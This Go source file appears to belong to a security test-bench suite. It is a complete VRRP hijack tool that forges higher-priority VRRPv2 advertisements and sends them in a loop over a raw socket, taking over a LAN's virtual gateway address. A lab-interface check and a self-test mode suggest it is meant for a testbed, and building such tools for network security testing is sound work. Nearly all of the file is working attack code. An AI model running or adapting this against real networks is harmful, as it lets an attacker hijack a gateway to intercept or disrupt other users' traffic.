package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

func internetChecksum(data []byte) uint16 {
	var sum uint32
	for len(data) >= 2 {
		sum += uint32(binary.BigEndian.Uint16(data[:2]))
		data = data[2:]
	}
	if len(data) == 1 {
		sum += uint32(data[0]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func buildVRRP(vrid int, virtualIP string, priority int, iface string) ([]byte, error) {
	if vrid < 0 || vrid > 255 {
		return nil, fmt.Errorf("invalid VRRP VRID %d", vrid)
	}
	if priority < 0 || priority > 255 {
		return nil, fmt.Errorf("invalid VRRP priority %d", priority)
	}
	vip := net.ParseIP(virtualIP).To4()
	if vip == nil {
		return nil, fmt.Errorf("invalid VRRP virtual IP %q", virtualIP)
	}

	vrrp := make([]byte, 20)
	vrrp[0] = 0x21
	vrrp[1] = byte(vrid)
	vrrp[2] = byte(priority)
	vrrp[3] = 1
	vrrp[4] = 0
	vrrp[5] = 1
	copy(vrrp[8:12], vip)
	// VRRPv2 uses a bare checksum over its body, with no IP pseudo-header.
	binary.BigEndian.PutUint16(vrrp[6:8], internetChecksum(vrrp))

	dstMAC := net.HardwareAddr{0x01, 0x00, 0x5e, 0x00, 0x00, 0x12}
	vmac := net.HardwareAddr{0x00, 0x00, 0x5e, 0x00, 0x01, byte(vrid & 0xff)}
	dstIP := net.IPv4(224, 0, 0, 18)
	// Deliberate determinism improvement: Python lets Scapy route-resolve IP.src; pin it to eth1's IPv4.
	srcIP := attackcommon.InterfaceIPv4(iface)
	ip := attackcommon.BuildIPv4(srcIP, dstIP, 112, vrrp)
	frame := make([]byte, 14, 14+len(ip))
	copy(frame[0:6], dstMAC)
	copy(frame[6:12], vmac)
	binary.BigEndian.PutUint16(frame[12:14], 0x0800)
	return append(frame, ip...), nil
}

func run() int {
	fs, common := attackcommon.BaseParser("VRRP hijack: forge a higher-priority advertisement")
	vrid := fs.Int("vrid", 1, "")
	virtualIP := fs.String("virtual_ip", "192.168.1.1", "")
	priority := fs.Int("priority", 255, "")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	frame, err := buildVRRP(*vrid, *virtualIP, *priority, common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", fmt.Sprintf("VRRP packet build failed: %v", err))
		return 1
	}
	if common.Selftest {
		attackcommon.SelftestOK("vrrp_hijack", fmt.Sprintf("VRRP advertisement len=%d", len(frame)))
		return 0
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		frame, err := buildVRRP(*vrid, *virtualIP, *priority, common.Iface)
		if err != nil {
			return err
		}
		if err := sender.Send(frame); err != nil {
			return fmt.Errorf("send VRRP frame: %w", err)
		}
		attackcommon.Status("SENT", fmt.Sprintf("advertisement #%d vrid=%d vip=%s priority=%d", n+1, *vrid, *virtualIP, *priority))
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
